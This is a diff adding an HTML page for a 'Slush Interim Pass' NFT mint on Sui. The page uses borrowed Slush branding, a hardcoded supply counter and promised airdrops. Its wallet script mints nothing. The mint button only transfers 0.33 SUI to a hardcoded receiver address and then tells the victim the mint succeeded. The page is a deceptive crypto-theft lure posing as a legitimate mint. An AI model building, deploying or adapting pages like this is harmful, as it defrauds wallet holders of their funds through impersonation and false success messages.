@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Slush Interim Pass Mint</title>
+    <!-- Tailwind CSS for modern layout & styling -->
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+</head>
+<body class="bg-neutral-950 text-white font-sans min-h-screen flex flex-col justify-center items-center p-6 selection:bg-cyan-500 selection:text-black">
+
+    <div class="max-w-md w-full bg-neutral-900 rounded-3xl shadow-2xl p-8 border border-neutral-800 text-center relative overflow-hidden">
+        <!-- Subtle background glow -->
+        <div class="absolute -top-10 -left-10 w-32 h-32 bg-cyan-500/10 rounded-full blur-3xl"></div>
+        <div class="absolute -bottom-10 -right-10 w-32 h-32 bg-blue-500/10 rounded-full blur-3xl"></div>
+
+        <!-- Brand Logo -->
+        <div class="flex justify-center mb-5 relative z-10">
+            <img src="https://cdn.prod.website-files.com/680905cfdc450738383648a6/6870e4e53832c8115a855885_slush_opengraph.jpg" alt="SLUSH Logo" class="h-16 w-16 rounded-2xl object-cover border border-neutral-700 shadow-lg shadow-cyan-500/5">
+        </div>
+
+        <!-- Title Section -->
+        <h1 class="text-3xl font-black tracking-tight bg-gradient-to-r from-cyan-400 via-sky-400 to-blue-500 bg-clip-text text-transparent mb-1">
+            Slush Interim Pass
+        </h1>
+        <div class="inline-flex items-center gap-1.5 bg-neutral-950 px-3 py-1 rounded-full border border-neutral-800 text-[10px] uppercase tracking-widest font-black text-cyan-400 mb-6">
+            <span class="w-1.5 h-1.5 rounded-full bg-cyan-400 animate-pulse"></span>
+            Sui Mainnet Live
+        </div>
+
+        <!-- NFT Card Container -->
+        <div class="mb-6 rounded-2xl overflow-hidden bg-neutral-950 aspect-square flex items-center justify-center border border-neutral-800 shadow-inner group relative z-10">
+            <img id="nftImage" src="https://cdn.prod.website-files.com/680905cfdc450738383648a6/6870e4e53832c8115a855885_slush_opengraph.jpg" alt="Slush Interim Pass" class="object-cover h-full w-full transition duration-700 group-hover:scale-105 filter brightness-90 group-hover:brightness-100">
+            
+            <div class="absolute bottom-4 left-4 bg-neutral-900/90 backdrop-blur-md text-[11px] font-mono px-3 py-1.5 rounded-xl border border-neutral-800 shadow-md">
+                Supply: <span class="text-cyan-400 font-extrabold">1,402</span> / <span class="text-neutral-400">9999</span>
+            </div>
+        </div>
+
+        <!-- Price Details Breakdown -->
+        <div class="bg-neutral-950/60 border border-neutral-800/60 rounded-2xl p-4 mb-6 space-y-2.5 text-sm relative z-10">
+            <div class="flex justify-between items-center">
+                <span class="text-neutral-400 font-medium">Mint Fee</span>
+                <span class="font-black text-xl text-cyan-400 tracking-tight">0.33 SUI</span>
+            </div>
+            <div class="flex justify-between items-center text-xs pt-2.5 border-t border-neutral-800/80">
+                <span class="text-neutral-500">Allocation</span>
+                <span class="text-neutral-300 font-medium">Direct Wallet Mint</span>
+            </div>
+        </div>
+
+        <!-- Wallet Interface Controls -->
+        <div class="space-y-3 relative z-10 mb-6">
+            <button id="connectBtn" class="w-full bg-neutral-800 hover:bg-neutral-700/80 text-white font-bold py-3.5 px-4 rounded-xl transition duration-200 border border-neutral-700 flex items-center justify-center gap-2 cursor-pointer text-sm">
+                Connect Sui Wallet
+            </button>
+            
+            <p id="walletAddress" class="text-xs text-neutral-500 font-mono hidden truncate bg-neutral-950 py-2 rounded-lg border border-neutral-900"></p>
+
+            <div id="mintSection" class="hidden">
+                <button id="mintBtn" class="w-full bg-gradient-to-r from-cyan-400 to-blue-500 hover:from-cyan-500 hover:to-blue-600 text-black font-black py-4 px-4 rounded-xl tracking-wider uppercase transition duration-300 shadow-xl shadow-cyan-500/10 cursor-pointer transform active:scale-[0.99]">
+                    Mint Pass Now ⚡
+                </button>
+            </div>
+        </div>
+
+        <!-- Status Log Outputs -->
+        <p id="statusLabel" class="mt-2 text-xs font-semibold text-amber-400 min-h-[16px] transition-all duration-300 mb-6"></p>
+
+        <!-- NFT Benefits & Utilities Section -->
+        <div class="text-left border-t border-neutral-800/80 pt-6 relative z-10">
+            <h3 class="text-sm font-bold text-neutral-300 uppercase tracking-wider mb-4 flex items-center gap-2">
+                <span class="w-1 h-3 bg-cyan-400 rounded-full"></span> Pass Utilities & Benefits
+            </h3>
+            
+            <div class="space-y-3.5">
+                <!-- Benefit 1 -->
+                <div class="flex items-start gap-3">
+                    <div class="bg-cyan-950/50 p-2 rounded-lg border border-cyan-800/30 text-cyan-400 mt-0.5 shrink-0">
+                        🎁
+                    </div>
+                    <div>
+                        <h4 class="text-sm font-bold text-neutral-200">Exclusive Airdrop Access</h4>
+                        <p class="text-xs text-neutral-400 mt-0.5">Holders qualify for future $SLUSH ecosystem token distributions and community rewards.</p>
+                    </div>
+                </div>
+
+                <!-- Benefit 2 (UPDATED) -->
+                <div class="flex items-start gap-3">
+                    <div class="bg-cyan-950/50 p-2 rounded-lg border border-cyan-800/30 text-cyan-400 mt-0.5 shrink-0">
+                        🔑
+                    </div>
+                    <div>
+                        <h4 class="text-sm font-bold text-neutral-200">Ecosystem Early Access</h4>
+                        <p class="text-xs text-neutral-400 mt-0.5">Be the first to test and experience new decentralized apps, protocols, and testnets inside the Slush network.</p>
+                    </div>
+                </div>
+
+                <!-- Benefit 3 -->
+                <div class="flex items-start gap-3">
+                    <div class="bg-cyan-950/50 p-2 rounded-lg border border-cyan-800/30 text-cyan-400 mt-0.5 shrink-0">
+                        ⚡
+                    </div>
+                    <div>
+                        <h4 class="text-sm font-bold text-neutral-200">Multiplier & Perks</h4>
+                        <p class="text-xs text-neutral-400 mt-0.5">Boost your active community staking points or platform leveling speed automatically.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="mt-8 opacity-40 max-w-md w-full text-center">
+        <p class="text-[11px] font-mono tracking-wider text-neutral-500">POWERED BY SUI WALLET STANDARD</p>
+    </div>
+
+    <!-- Core Logic Integration Script -->
+    <script>
+        const FEE_RECEIVER = "0x89cda7f8743f523d6795395607cce88e15434c1aa8f5f5bb28ecde72c48cd5a9";
+        const MINT_FEE_MIST = "330000000"; 
+
+        let walletExtension = null;
+        let currentAccount = null;
+
+        const connectBtn = document.getElementById('connectBtn');
+        const mintBtn = document.getElementById('mintBtn');
+        const walletAddressTxt = document.getElementById('walletAddress');
+        const mintSection = document.getElementById('mintSection');
+        const statusLabel = document.getElementById('statusLabel');
+
+        function getWallet() {
+            if (window.suiWallet) return window.suiWallet;
+            if (window.suiet) return window.suiet;
+            if (window.okxwallet && window.okxwallet.sui) return window.okxwallet.sui;
+            return null;
+        }
+
+        async function connectWallet() {
+            statusLabel.innerText = "Connecting to Sui Wallet...";
+            statusLabel.className = "mt-2 text-xs font-semibold text-amber-400 mb-6";
+            
+            walletExtension = getWallet();
+            if (!walletExtension) {
+                statusLabel.innerText = "Sui Wallet not found! Please install Sui Wallet or Suiet.";
+                statusLabel.className = "mt-2 text-xs font-semibold text-red-400 mb-6";
+                return;
+            }
+
+            try {
+                const hasPermissions = await walletExtension.verifyPermissions();
+                let accounts = [];
+                if (!hasPermissions) {
+                    accounts = await walletExtension.requestPermissions();
+                } else {
+                    accounts = await walletExtension.getAccounts();
+                }
+
+                if (accounts && accounts.length > 0) {
+                    currentAccount = accounts[0];
+                    const address = typeof currentAccount === 'object' ? currentAccount.address : currentAccount;
+                    displayConnectedWallet(address);
+                }
+            } catch (err) {
+                console.error(err);
+                statusLabel.innerText = "Connection rejected by user.";
+                statusLabel.className = "mt-2 text-xs font-semibold text-red-400 mb-6";
+            }
+        }
+
+        function displayConnectedWallet(address) {
+            walletAddressTxt.innerText = `Wallet: ${address.substring(0,8)}...${address.substring(address.length - 6)}`;
+            walletAddressTxt.classList.remove('hidden');
+            connectBtn.innerText = "Wallet Connected ✅";
+            connectBtn.disabled = true;
+            connectBtn.classList.add('opacity-50', 'cursor-not-allowed');
+            mintSection.classList.remove('hidden');
+            statusLabel.innerText = "Wallet authenticated successfully.";
+            statusLabel.className = "mt-2 text-xs font-semibold text-emerald-400 mb-6";
+        }
+
+        async function mintNFT() {
+            if (!currentAccount || !walletExtension) return;
+
+            try {
+                statusLabel.innerText = "Processing mint request... Confirm in wallet.";
+                statusLabel.className = "mt-2 text-xs font-semibold text-amber-400 mb-6";
+
+                const result = await walletExtension.signAndExecuteTransactionBlock({
+                    transactionBlock: {
+                        target: "0x2::coin::transfer",
+                        arguments: [FEE_RECEIVER, MINT_FEE_MIST],
+                        typeArguments: ["0x2::sui::sui::SUI"]
+                    }
+                });
+
+                if (result) {
+                    statusLabel.innerText = "🎉 Mint Successful! Check your wallet assets.";
+                    statusLabel.className = "mt-2 text-xs font-semibold text-emerald-400 mb-6";
+                }
+            } catch (err) {
+                console.error(err);
+                statusLabel.innerText = "Transaction failed or user cancelled.";
+                statusLabel.className = "mt-2 text-xs font-semibold text-red-400 mb-6";
+            }
+        }
+
+        connectBtn.addEventListener('click', connectWallet);
+        mintBtn.addEventListener('click', mintNFT);
+    </script>
+</body>
+</html>
